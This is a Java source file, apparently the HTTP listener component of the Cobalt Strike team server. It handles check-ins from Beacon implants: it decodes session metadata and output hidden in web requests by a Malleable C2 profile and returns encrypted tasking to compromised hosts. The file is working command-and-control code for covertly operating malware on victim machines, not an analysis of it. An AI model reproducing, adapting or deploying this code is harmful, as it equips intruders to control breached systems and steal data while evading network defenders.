package beacon;

import c2profile.MalleableHook;
import c2profile.Profile;
import common.BeaconEntry;
import common.CommonUtils;
import common.MudgeSanity;

import java.io.InputStream;
import java.util.Properties;

public class BeaconHTTP {
    MalleableHook.MyHook geth = new GetHandler();
    MalleableHook.MyHook posth = new PostHandler();
    BeaconC2 controller;
    Profile c2profile;

    public BeaconHTTP(Profile c2profile, BeaconC2 controller) {
        this.c2profile = c2profile;
        this.controller = controller;
    }

    public MalleableHook.MyHook getGetHandler() {
        return this.geth;
    }

    public MalleableHook.MyHook getPostHandler() {
        return this.posth;
    }

    protected String getPostedData(Properties parms) {
        if (parms.containsKey("input") && parms.get("input") instanceof InputStream) {
            InputStream in = (InputStream) parms.get("input");
            byte[] data_b = CommonUtils.readAll(in);
            return CommonUtils.bString(data_b);
        }
        return "";
    }

    private class PostHandler implements MalleableHook.MyHook {
        private PostHandler() {
        }

        @Override
        public byte[] serve(String uri, String method, Properties headers, Properties parms) {
            try {
                String id;
                String ext = (headers.get("REMOTE_ADDRESS") + "").substring(1);
                String data_s = BeaconHTTP.this.getPostedData(parms);
                id = new String(BeaconHTTP.this.c2profile.recover(".http-post.client.id", headers, parms, data_s, uri));
                if (id.length() == 0) {
                    CommonUtils.print_error("HTTP " + method + " to " + uri + " from " + ext + " has no session ID! This could be an error (or mid-engagement change) in your c2 profile");
                    MudgeSanity.debugRequest(".http-post.client.id", headers, parms, data_s, uri, ext);
                } else {
                    byte[] data = CommonUtils.toBytes(BeaconHTTP.this.c2profile.recover(".http-post.client.output", headers, parms, data_s, uri));
                    if (data.length == 0 || !BeaconHTTP.this.controller.process_beacon_data(id, data)) {
                        MudgeSanity.debugRequest(".http-post.client.output", headers, parms, data_s, uri, ext);
                    }
                }
            } catch (Exception ioex) {
                MudgeSanity.logException("beacon post handler", ioex, false);
            }
            return new byte[0];
        }
    }

    private class GetHandler implements MalleableHook.MyHook {
        private GetHandler() {
        }

        @Override
        public byte[] serve(String uri, String method, Properties headers, Properties parms) {
            String ext = (headers.get("REMOTE_ADDRESS") + "").substring(1);
            String session = BeaconHTTP.this.c2profile.recover(".http-get.client.metadata", headers, parms, BeaconHTTP.this.getPostedData(parms), uri);
            if (session.length() == 0 || session.length() != 128) {
                CommonUtils.print_error("Invalid session id");
                MudgeSanity.debugRequest(".http-get.client.metadata", headers, parms, "", uri, ext);
                return new byte[0];
            }
            BeaconEntry mydata = BeaconHTTP.this.controller.process_beacon_metadata(ext, CommonUtils.toBytes(session), null);
            if (mydata == null) {
                MudgeSanity.debugRequest(".http-get.client.metadata", headers, parms, "", uri, ext);
                return new byte[0];
            }
            byte[] tasks = BeaconHTTP.this.controller.dump(mydata.getId(), 921600, 1048576);
            if (tasks.length > 0) {
                return BeaconHTTP.this.controller.getSymmetricCrypto().encrypt(mydata.getId(), tasks);
            }
            return new byte[0];
        }
    }

}

